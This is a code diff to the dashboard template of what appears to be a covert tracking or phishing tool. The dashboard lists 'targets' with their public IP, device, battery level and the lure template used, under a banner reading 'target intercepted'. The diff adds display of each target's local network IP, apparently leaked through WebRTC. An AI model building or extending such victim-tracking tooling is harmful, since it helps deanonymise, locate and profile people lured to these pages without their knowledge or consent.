@@ -138,6 +138,7 @@
                                         <td class="text-muted"><small>{{ v.date }}</small></td>
                                         <td>
                                             <strong class="text-white">{{ v.ip }}</strong><br>
+                                            {% if v.webrtc and v.webrtc != 'Not Available' %}<small class="text-info" title="Local WebRTC IP"><i class="fa-solid fa-network-wired"></i> {{ v.webrtc }}</small><br>{% endif %}
                                             <span class="badge bg-secondary mt-1"><i class="fa-solid fa-bullseye"></i> {{ v.template }}</span>
                                         </td>
                                         <td>
@@ -269,6 +270,7 @@
                                     <strong style="color: #ff4757; font-size: 1.1em;"><i class="fa-solid fa-skull-crossbones"></i> CIBLE INTERCEPTÉE</strong>
                                 </div>
                                 <i class="fa-solid fa-network-wired text-info" style="width: 15px;"></i> IP: <code style="color: #00a8ff;">{{ v.ip }}</code><br>
+                                {% if v.webrtc and v.webrtc != 'Not Available' %}<i class="fa-solid fa-ethernet text-muted" style="width: 15px;"></i> LAN: <code style="color: #ff9f43;">{{ v.webrtc }}</code><br>{% endif %}
                                 <i class="fa-solid fa-clock text-muted" style="width: 15px;"></i> Date: <span style="font-size: 0.9em; color:#aaa;">{{ v.date }}</span><br>
                                 <i class="fa-solid fa-desktop text-light" style="width: 15px;"></i> Appareil: <span style="font-size: 0.9em;">{{ v.os }}</span><br>
                                 {% if v.battery and v.battery != 'Not Available' %}<i class="fa-solid fa-battery-half text-warning" style="width: 15px;"></i> Batterie: <span style="font-size: 0.9em;">{{ v.battery }}</span><br>{% endif %}
